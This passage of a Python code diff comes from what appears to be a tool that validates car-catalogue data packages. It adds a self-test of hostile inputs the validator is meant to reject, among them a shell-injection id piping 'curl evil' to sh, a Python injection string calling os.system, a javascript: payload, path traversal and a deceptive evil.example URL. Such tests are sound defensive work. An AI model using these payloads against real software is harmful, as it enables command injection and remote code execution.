+                h["drop"].setdefault(cid, []).append(t)
+        t = v["hero"]
+        if t is not None:
+            if t not in mine or t in h["drop"].get(cid, []):
+                ignored.append(f"hero {cid}: {t!r} is not among your run's kept photos")
+            else:
+                h["hero"][cid] = t
+    with open(heroes_path, "w", encoding="utf-8", newline="\n") as fh:
         json.dump(h, fh, ensure_ascii=False, indent=1)
-    print("heroes.json updated. Still look at every photo yourself (tools/REFRESH.md, Dev step 5).")
-    for s in skipped:
-        print("skipped:", s)
+    print("heroes.json updated; now look at every photo yourself (tools/REFRESH.md, Dev step 4).")
+    for s in ignored:
+        print("ignored (report it):", s)
+    return ignored
 
 
 def report(pkg):
-    code = lambda s: "`" + s + "`"     # every value passed text()/https_url(): no backticks inside
-    out = [f"### Scout package {pkg['month']} (window {pkg['window'][0]} to {pkg['window'][1]})", ""]
+    out = ["Scout package (untrusted text, quoted as code):", "", "```text",
+           f"window {pkg['window'][0]} to {pkg['window'][1]}"]
     for c in pkg["cars"]:
-        out.append(f"- **{c['name']}** ({code(c['id'])}, {c['kind']}, {c['year']}): " +
-                   ", ".join(code(u) for u in c["sources"]))
-    for f in pkg["fills"]:
-        out.append(f"- fill {code(f['id'])}.{f['field']} = {code(repr(f['value']))}: " +
-                   ", ".join(code(u) for u in f["sources"]))
-    for s in pkg["skipped"]:
-        out.append(f"- not added: {s['name']} ({s['reason']})")
-    if len(out) == 2:
-        out.append("- nothing new")
+        out.append(f"{c['id']} | {c['name']} | {c['kind']} | {c['year']}")
+        out += [f"    {u}" for u in c["sources"]]
+    if pkg["notes"]:
+        out.append("notes: " + pkg["notes"])
+    out.append("```")
     print("\n".join(out))
 
 
+def self_test():
+    """Cyber's hostile cases a-j, on a scratch copy of catalog.py and heroes.json."""
+    good = {"id": "zz-self-test", "family": "Temerario", "name": "Self Test", "kind": "Limited series",
+            "year": 2026, "end": 0, "body": "Coupé", "engine": "4.0 L V8", "eng": "V8", "cv": 900,
+            "units": None, "designer": None, "wiki": None, "note": "A note.",
+            "cats": ["Lamborghini Self Test"], "perf": [340, False, 2.7],
+            "sources": ["https://en.wikipedia.org/wiki/Lamborghini"]}
+    base = {"version": 1, "window": ["2026-10-01", "2026-11-01"], "cars": [good], "photos": {}, "notes": ""}
+    one = lambda **kw: dict(base, cars=[dict(good, **kw)])
+    some_id = next(iter(load_catalog()[0]))
+    js = json.dumps(base)
+    cases = {
+        "b newline": one(note="a\nb"), "b CR": one(note="a\rb"), "b bidi": one(note="a‮b"),
+        "b zero-width": one(note="a​b"), "c comment-script": one(note="<!--<script x"),
+        "c __LI_APP__": one(note="__LI_APP__"), "c javascript:": one(note="javascript:alert(1)"),
+        "c template": one(note="{{u|x}}"), "d shell id": one(id="a,b;curl evil|sh"),
+        "d path id": one(id="../x"), "d capital id": one(id="Miura"), "d existing id": one(id=some_id),
+        "e year true": one(year=True), "e year string": one(year="1971"), "e year float": one(year=1971.5),
+        "e year NaN": js.replace('"year": 2026', '"year": NaN'),
+        "e year 1e400": js.replace('"year": 2026', '"year": 1e400'),
+        "e cv -1": one(cv=-1), "e cv 99999": one(cv=99999),
+        "f kind": one(kind="Hypercar"), "f eng": one(eng="W16"),
+        "g duplicate key": js.replace('"version": 1', '"version": 1, "version": 1'),
+        "g extra key": dict(base, exec="x"), "g extra car key": one(exec="x"),
+        "h http": one(sources=["http://en.wikipedia.org/wiki/X"]),
+        "h lamborghini.com": one(sources=["https://www.lamborghini.com/x"]),
+        "h userinfo": one(sources=["https://en.wikipedia.org@evil.example/"]),
+        "j over 64 KB": js + " " * MAX_BYTES,
+        "j 21 cars": dict(base, cars=[dict(good, id=f"zz-{i}") for i in range(21)]),
+    }
+    tmpd = tempfile.mkdtemp()
+    cat, pk = os.path.join(tmpd, "catalog.py"), os.path.join(tmpd, "p.json")
+
+    def run(p):
+        with open(pk, "w", encoding="utf-8") as fh:
+            fh.write(p if isinstance(p, str) else json.dumps(p, ensure_ascii=False))
+        shutil.copy(CATALOG, cat)
+        pkg = validate(load(pk), cat)
+        apply(pkg, cat)
+        return pkg
+    fails = []
+    try:
+        for name, p in cases.items():
+            try:
+                run(p)
+                fails.append(f"{name}: accepted")
+            except Bad:
+                pass
+        evil = "x'); import os; os.system('id') #"         # (a) must import as an inert string
+        run(one(note=evil))
+        row, call = load_catalog(cat)[0]["zz-self-test"]
+        if row["note"] != evil or not isinstance(call.args[14], ast.Constant):
+            fails.append("a: not an inert string constant")
+        hp = os.path.join(tmpd, "heroes.json")               # (i) titles not in your own run
+        shutil.copy(HEROES, hp)
+        pkg = dict(base, photos={"zz-self-test": {"drop": ["Mine.jpg", "Not mine.jpg"], "hero": "flickr:1"}})
+        ign = photos(pkg, own={"zz-self-test": {"Mine.jpg"}}, heroes_path=hp)
+        h = json.load(open(hp, encoding="utf-8"))
+        if len(ign) != 2 or h["drop"].get("zz-self-test") != ["Mine.jpg"] or "zz-self-test" in h["hero"]:
+            fails.append("i: picks outside your own run were applied")
+    finally:
+        shutil.rmtree(tmpd)
+    for f in fails:
+        print("FAIL", f)
+    print("self-test " + ("FAILED" if fails else f"OK: {len(cases)} hostile packages rejected, "
+                          "(a) imported as an inert string, (i) picks outside your run ignored"))
+    return not fails
+
+
 def main():
+    if sys.argv[1:] == ["--self-test"]:
+        sys.exit(0 if self_test() else 1)
     if len(sys.argv) != 3 or sys.argv[1] not in ("check", "apply", "photos", "report"):
         sys.exit(__doc__.split("\n\n")[1])
     try:
-        pkg = validate(load(sys.argv[2]), applied_ok=sys.argv[1] in ("photos", "report"))
+        pkg = load(sys.argv[2])
+        if sys.argv[1] in ("check", "apply"):
+            validate(pkg)
+            if sys.argv[1] == "check":
+                print(f"package OK: {len(pkg['cars'])} cars, photo picks for {len(pkg['photos'])} cars")
+            else:
+                apply(pkg)
+        else:
+            # After apply the rows exist, so validate against main's catalogue instead of today's file.
+            base = subprocess.run(["git", "-C", ROOT, "show", "origin/main:tools/catalog.py"],
+                                  capture_output=True, text=True, check=True).stdout
+            with tempfile.TemporaryDirectory() as d:
+                p = os.path.join(d, "catalog.py")
+                with open(p, "w", encoding="utf-8") as fh:
+                    fh.write(base)
+                validate(pkg, p)
+            (photos if sys.argv[1] == "photos" else report)(pkg)
     except Bad as e:
         sys.exit("package rejected:\n" + str(e))
-    if sys.argv[1] == "check":
-        print(f"package OK: {len(pkg['cars'])} new cars, {len(pkg['fills'])} fills, "
-              f"{len(pkg['photos']['drop'])} drops, {len(pkg['photos']['hero'])} heroes")
-    else:
-        try:
-            {"apply": apply, "photos": photos, "report": report}[sys.argv[1]](pkg)
-        except Bad as e:
-            sys.exit(str(e))
 
 
 if __name__ == "__main__":
